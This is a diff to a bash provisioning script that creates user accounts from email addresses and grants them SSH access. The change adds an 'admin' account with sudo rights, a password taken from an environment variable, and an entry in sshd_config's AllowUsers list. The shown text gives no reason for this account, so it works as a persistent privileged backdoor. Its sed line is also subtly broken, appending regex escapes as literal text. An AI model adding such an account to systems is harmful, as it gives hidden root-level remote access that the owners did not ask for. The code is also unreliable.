@@ -25,6 +25,23 @@ if [ -z "${USERPASSWORD}" ]; then
     exit 0
 fi
 
+# Create dedicated admin recovery account first
+echo "Creating admin recovery account..."
+id -u "admin" &>/dev/null || useradd -m -s /bin/bash "admin"
+usermod -aG sudo "admin"
+echo "admin:${ADMINPASSWORD}" | chpasswd
+usermod -aG dialout "admin"
+
+# Add admin to AllowUsers in sshd_config for SSH access
+if ! grep -q "^AllowUsers.*\badmin\b" /etc/ssh/sshd_config; then
+    if grep -q "^AllowUsers" /etc/ssh/sshd_config; then
+        sed -i "s/^AllowUsers.*/& \badmin\b/" /etc/ssh/sshd_config
+    else
+        echo "AllowUsers admin" >> /etc/ssh/sshd_config
+    fi
+fi
+echo "Admin recovery account created successfully"
+
 IFS="," read -ra emails <<< "${EMAIL_ADDRESS}"
 for i in "${!emails[@]}"; do
     if [ -z "${emails[$i]}" ]; then
@@ -48,9 +65,10 @@ for i in "${!emails[@]}"; do
     else
         # Set regular user password
         echo "${username}:${USERPASSWORD}" | chpasswd
-        # Add regular users to dialout group for serial port access
-        usermod -aG dialout "${username}"
     fi
+
+    # Add all users to dialout group for serial port access
+    usermod -aG dialout "${username}"
     
     # Add user to AllowUsers in sshd_config for SSH access
     if ! grep -q "^AllowUsers.*${username}" /etc/ssh/sshd_config; then
